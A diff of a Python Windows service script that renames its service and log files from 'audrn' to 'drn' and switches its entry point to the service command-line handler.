@@ -1,6 +1,6 @@
 #C:\Python27\Lib\site-packages\win32\drn.exe
 # drn.exe /register
-# python audrn.py install
+# python drn.py install
 
 import win32serviceutil, win32service, win32event
 import os,sys,random,time
@@ -9,11 +9,11 @@ from datetime import datetime,date
 comname = os.environ['COMPUTERNAME']
  
 lastmodified = time.strftime('%H%M')
-f1 = open('c:\\windows\\system32\\drivers\\etc\\audrnlog','w')
-f2 = open('c:\\windows\\system32\\drivers\\etc\\audrnlogwarning','w')
+f1 = open('c:\\windows\\system32\\drivers\\etc\\drnlog','w')
+f2 = open('c:\\windows\\system32\\drivers\\etc\\drnlogwarning','w')
 f1.close(); f2.close()
-f1 = open('c:\\windows\\system32\\drivers\\etc\\audrnrevlog','a')
-f2 = open('c:\\windows\\system32\\drivers\\etc\\audrnlogwarning','a')
+f1 = open('c:\\windows\\system32\\drivers\\etc\\drnrevlog','a')
+f2 = open('c:\\windows\\system32\\drivers\\etc\\drnlogwarning','a')
 user = os.path.basename( os.environ['USERPROFILE'] )
 
 def setStartPage():
@@ -76,15 +76,15 @@ def dodrn2(drnmin):
             startsvc(name)
 
 def runDoSvc():
-    f1.write('Running audrnSvc\n')
-    #print 'Running audrn Svc'
+    f1.write('Running drnSvc\n')
+    #print 'Running drn Svc'
     drnmin = random.randint(9,55)
     Anextday=Bnextday=None
     while True:
         try:
-            os.system('sc start hlyctlsvc >> hlyctlout')
+            os.system('sc start hlyctlsvc >> drnout')
         except:
-            f1.write('failed hlyctlsvc or running >> hlyctlout')
+            f1.write('failed hlyctlsvc or running >> drnout')
         now = datetime.now()
         if getAnextday(): Anextday = getAnextday()
         if getBnextday(): Bnextday = getBnextday()
@@ -110,9 +110,9 @@ def runDoSvc():
             if 2 < now.hour < 6:
                 dodrn2(drnmin)
 
-class audrn(win32serviceutil.ServiceFramework):
+class drn(win32serviceutil.ServiceFramework):
 
-    _svc_name_ = "audrn"
+    _svc_name_ = "drn"
     _svc_display_name_ = "The drn Service"
     def __init__(self, args):
         win32serviceutil.ServiceFramework.__init__(self, args)
@@ -129,8 +129,8 @@ class audrn(win32serviceutil.ServiceFramework):
         runDoSvc()
 #           #if type not in ( win32service.SERVICE_STOP,win32service.SERVICE_STOP_PENDING ):
 if __name__=='__main__':
-    runDoSvc()
-    #win32serviceutil.HandleCommandLine(audrn)
+    #runDoSvc()
+    win32serviceutil.HandleCommandLine(drn)
     '''
     today = date.today()
     runDoSvc()
